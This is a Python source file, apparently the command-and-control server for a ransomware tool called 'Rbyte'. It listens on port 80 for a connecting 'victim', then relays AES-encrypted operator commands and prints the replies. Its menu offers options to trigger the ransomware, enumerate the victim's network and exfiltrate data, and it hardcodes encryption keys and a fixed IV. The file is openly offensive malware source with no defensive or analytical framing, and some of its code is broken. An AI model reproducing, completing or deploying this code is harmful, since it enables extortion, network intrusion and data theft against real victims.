#Rbyte the user server
#Under Development
#Updated Everyday
import socket
import os
from termcolor import colored
from Crypto.Cipher import AES
import sys
import os
import sys
import time

keys = {
    'enc0': 'A3317AF79FEB1C1778E27AFE728BEF8B',
    'enc1': '4CB54FEC78114473387BD86400EDF85B',
    'enc2': '9C2B81E47254333AA1218FB1B7697CEB',
    'enc3': 'E814DD5D259E8237D02A19F9CB8D078B'
}

log = '''
     ____                         
    /    )   /                   
---/___ /---/__--------_/_----__-
  /    |   /   ) /   / /    /___)
_/_____|__(___/_(___/_(_ __(___ _
                   /             
               (_ /              
            
            https://github.com/SxNade

Contact: SxNade@protonmail.com
'''
A = colored("1)", 'red')
B = colored("2)", 'red')
C = colored("3)", 'red')
D = colored("3)", 'red')

commands = f'''
#Please Read the man.txt file for info on options#

{A} run [trigger the ransomware will perform enum&exfil] ::
{B} enum [will enumerate the network] ::
{C} exfil [will start exfiltrating data] ::
{D} cgenc [will renew the encryption key] :: use with caution

'''

print(log)
print("[*] Loading First Encryption Key\n")
print(commands)

def svr():
    global s
    global conn
    s = socket.socket()
    s.bind((sys.argv[1], 80))
    s.listen(1)
    print(colored("\n[+] Command Server is Active Now Awaiting For Victim to Connect\n", 'green'))
    conn , addr = s.accept()
    print(f"[*] {addr} Successfully Connected")

def key_gen():
    print(colored("[+]Initializing Encryption Channel", 'green'))
    global enc_key
    enc_key = 'EBC3D4C51C46801A7267AAB59A63551B'

def start_encryption(key):
    global magic
    magic = AES.new(f'{enc_key}', AES.MODE_CFB, 'This is an IV456') #StackOverflow LOL!

def run():
    print(colored("[*] FiringUp Rapebyte Now..."))
    while True:
        usr = input(colored("\nRbyte~$ "))
        usr = usr.encode()
        usr_send = magic.encrypt(usr)
        conn.send(usr_send)
        In_messg = conn.recv(8192)
        recv_data_enc = magic.decrypt(In_messg)
        recv_data_dec = recv_data_enc.decode()
        print(recv_data_dec)


def main():
    svr()
main()

while True:
    usr = input(colored("\nRbyte~$ "))
    if usr == 'run':
        key_gen()
        start_encryption(enc_key)
        run()
